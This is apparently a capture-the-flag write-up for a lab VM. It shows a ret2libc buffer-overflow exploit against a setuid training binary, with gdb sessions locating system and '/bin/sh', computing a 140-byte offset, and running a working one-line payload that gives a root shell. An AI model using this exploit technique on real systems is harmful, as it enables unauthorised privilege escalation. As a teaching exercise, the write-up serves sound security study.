# ret2libc

<!--toc:start-->
- [ret2libc](#ret2libc)
  - [Get addresses](#get-addresses)
  - [Exploitation](#exploitation)
<!--toc:end-->

For the buffer overflow part we can use another method called [ret2libc](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc).

## Get addresses

Get address of `system`:

```bash
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
```

Get address of `/bin/sh`:

```bash
(gdb) find __libc_start_main,+99999999,"/bin/sh"
0xb7f8cc58
(gdb) x/s 0xb7f8cc58
0xb7f8cc58:      "/bin/sh"
```

Get saved eip offset:

```bash
(gdb) r $(python -c 'print "A" * 64')
Starting program: /home/zaz/exploit_me $(python -c 'print "A" * 64')

Breakpoint 1, 0x0804842c in main ()
(gdb) x/64xw $esp
0xbffff680:     0xbffff690      0xbffff8e9      0x00000000      0x00000000
0xbffff690:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff6a0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff6b0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff6c0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff6d0:     0x08048400      0x080496e8      0x00000002      0x080482dd
0xbffff6e0:     0xb7fd13e4      0x00100000      0x080496e8      0x08048461
0xbffff6f0:     0xffffffff      0xb7e5edc6      0xb7fd0ff4      0xb7e5ee55
0xbffff700:     0xb7fed280      0x00000000      0x08048449      0xb7fd0ff4
0xbffff710:     0x08048440      0x00000000      0x00000000      0xb7e454d3
(gdb) i f
Stack level 0, frame at 0xbffff720:
 eip = 0x804842c in main; saved eip 0xb7e454d3
 Arglist at 0xbffff718, args: 
 Locals at 0xbffff718, Previous frame s sp is 0xbffff720
 Saved registers:
  ebp at 0xbffff718, eip at 0xbffff71c
```

Buffer start at `0xbffff690` and eip start at `0xbffff71c`.

```bash
(gdb) p 0xbffff71c - 0xbffff690
$2 = 140
```

The offset is 140. We can exploit now.

## Exploitation

With the previous informations we can compose our exploit:

1. fill up to the offset of saved eip with some chars
2. write the address of `system`
3. write return address of system (we don't return but we need to fill it)
4. write the address of `/bin/sh`

We get this:

```bash
python -c 'print("A" * 140 + "\xb7\xe6\xb0\x60"[::-1] + "BBBB" + "\xb7\xf8\xcc\x58"[::-1])'
```

Try to use this exploit:

```bash
zaz@BornToSecHackMe:~$ ./exploit_me $(python -c 'print("A" * 140 + "\xb7\xe6\xb0\x60"[::-1] + "BBBB" + "\xb7\xf8\xcc\x58"[::-1])')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`BBBBX
$ id
uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
```
